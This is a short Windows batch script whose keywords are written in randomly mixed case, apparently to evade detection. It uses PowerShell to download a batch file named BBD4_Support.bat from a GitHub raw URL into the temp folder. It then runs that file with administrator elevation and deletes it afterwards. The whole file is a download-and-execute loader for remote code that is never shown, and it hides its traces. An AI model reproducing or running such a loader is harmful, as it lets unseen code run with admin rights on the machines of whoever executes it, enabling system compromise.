@echo off
sEtLoCaL
sEt "tEMPfIlE=%tEMp%\BBd4_sUpPoRT.bAT"
PoWErShElL -CoMmAnD "InVoKe-WeBrEqUeSt 'https://raw.githubusercontent.com/Pikinez/DataBase/main/BBD4_Support.bat' -OuTfIlE '%tEMpFIlE%'"
IF EXiSt "%TEmPFIlE%" (PoWERshELL -ComMAnd "StArT-PrOcEsS '%TeMpFiLe%' -vErB rUnAs -WaIT")
Del /F /Q "%TeMpFIlE%"
EnDlOCaL
ExIT
